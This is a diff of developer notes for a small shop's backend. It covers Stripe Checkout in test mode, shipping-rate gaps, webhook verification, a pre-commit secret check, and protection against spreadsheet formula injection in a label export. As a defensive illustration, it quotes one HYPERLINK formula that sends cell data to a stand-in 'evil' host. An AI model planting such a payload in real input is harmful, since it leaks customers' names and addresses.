+- `POST /api/stripe/webhook` — signature-verified payment events; **this is what marks an order paid**
+- `GET  /api/checkout/status?ref=` — order state for the return page, read from the database
 
 This is a dev-grade backend: flat files, no auth, no validation beyond the basics, single process.
 Anything real (payments, an admin view, sending mail) needs a proper backend behind it.
 
 ## Known TODOs
 
-- Payments: no processor is connected, so checkout **reserves** rather than charges — held 30
-  minutes, settled by DM. The card inputs are already gone, so nothing collects card data today;
-  keep it that way until Stripe (or similar) is actually wired up, and don't build a homegrown
-  card-handling path. Claims in the checkout trust strip must stay things the page really does —
-  "Encrypted checkout" was removed for that reason.
+- **Payments: Stripe Checkout is wired up in test mode and NOT deployed.** What is left is the
+  owner's call, not code: supply live keys, set `POC_ALLOW_LIVE_PAYMENTS=1`, register the webhook
+  endpoint on the real domain, and approve a deploy. See [STRIPE.md](STRIPE.md). Without keys the
+  site still runs the reserve-and-DM flow, and there are still no card fields anywhere — hosted
+  Checkout is what keeps it that way. Claims in the checkout copy must stay things the page really
+  does; `applyPaymentCopy()` swaps every one of them with the flow.
+- **Shipping: the flat `SHIPPING_TIERS` ladder is cart-only now, and that closed both of its
+  problems at checkout** (weights correct as of `844518a`; worksheet in [STRIPE.md](STRIPE.md)).
+  Those prices are national-average placeholders nobody quoted, and the ladder has no 4, 6, 7, 8
+  or 9 lb band — it jumps 3→5→10 — so a 12-shirt order at 5.4 lb was quoted the 10 lb rate of
+  $17.00, as were 2 pairs of shoes, 3 bags, and 2 bags + 4 shirts. Neither reaches a charged price
+  any more: the checkout panel shows a verified zone rate or sends the order to a manual quote, and
+  the cart's figure is labelled *Estimated*. What is left is coverage, and none of it blocks
+  launch — see `python3 tools/shipping_gaps.py`. **Category weights are still estimates — use a
+  scale before real money**, and the per-unit volumes in `assumed_unit_cu_in` have never been
+  measured at all.
 - Resend: `/api/subscribe` has a TODO for the welcome email and drop announcements; account/API key
   not set up yet.
 - **Photo quality and provenance.** The workbook shots max out at ~420px, which is soft for a
@@ -473,10 +927,31 @@ disabled button alone does not.
   those lines the delete failed with "unknown productId", an error the owner cannot act on. The
   confirm dialog now names the affected shipments, and a failed publish restores them.
 
+- **The webhook verifies signatures and amounts before anything moves.** Either check failing means
+  the order stays pending: an unsigned or forged event is a 400, and an amount or currency that
+  does not match the order is accepted with a 200 (so Stripe stops retrying) but deliberately not
+  acted on. Removing either check turns "someone can POST JSON at your server" into "someone can
+  order free merchandise".
+
+- **`/api/labels.csv` neutralises spreadsheet formulas.** Every name and address line in that
+  export is typed by a customer at checkout, and the owner opens the file in Excel or Sheets and
+  uploads it to Pirate Ship. A cell beginning `=`, `+`, `-`, `@`, tab or CR is parsed as a
+  **formula** by every major spreadsheet, so a buyer named `=HYPERLINK("http://evil/?x="&A1,"hi")`
+  gets code running in the owner's spreadsheet with every other customer's name, address and email
+  in scope. `csv.writer` does not help — it quotes delimiters so the file *parses* correctly, but
+  the danger is in how it is *interpreted* afterwards. `csv_safe()` prefixes a leading trigger with
+  an apostrophe, which every spreadsheet reads as "the rest is text". A real address never starts
+  with one of those characters, so it only fires on input that was already malformed. Admin auth on
+  the endpoint limits who can *trigger* the export, not who can *plant* the payload — any buyer can.
+  **A new column added to that row must go through `csv_safe()`**; `tests/test_label_csv.py` reads
+  the source and fails if a `ship_to` field is written raw.
+
 **The pre-commit hook needs updating whenever a new secret file is introduced.** It is a fixed list
 of filenames, not a rule: `costs.json` was added to the repo and the hook happily committed it
 until the pattern was extended. Anything new that holds credentials or business data goes in
-`tools/pre-commit`, `.gitignore` and `PRIVATE_FILES` together.
+`tools/pre-commit`, `.gitignore` and `PRIVATE_FILES` together. `stripe_config.json` was added to
+all three when Stripe went in, and the hook also greps for a bare `sk_`/`whsec_` string pasted into
+any tracked file.
 
 **Cross-platform:** every path goes through `os.path.join`, there are no shell-outs and no absolute
 paths, so the server runs unchanged on Windows. One caveat: `os.chmod(..., 0o600)` on
